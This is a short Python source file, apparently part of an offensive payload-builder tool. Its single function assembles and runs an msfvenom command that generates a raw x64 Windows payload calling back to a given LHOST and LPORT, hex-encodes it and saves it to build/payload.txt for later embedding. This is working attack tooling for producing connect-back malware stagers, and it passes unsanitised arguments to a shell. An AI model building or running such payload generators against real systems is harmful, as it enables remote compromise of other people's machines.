import subprocess

# Function to generate a payload using msfvenom and save bytes of the payload in a file
def msfvenom(payload, rhost, rport, ruri, verbose):
    RURI_part = f" LURI={ruri}" if (ruri and "http" in payload) else ""
    VERBOSE_part = " 2>/dev/null" if not verbose else ""
    command = f"msfvenom -p {payload} LHOST={rhost} LPORT={rport} {RURI_part} -a x64 --platform windows -f raw {VERBOSE_part} | xxd -p | tr -d '\\n' > build/payload.txt"
    print(f"Generating payload :\n{command}") if verbose else None
    subprocess.run(command, shell=True, check=True)
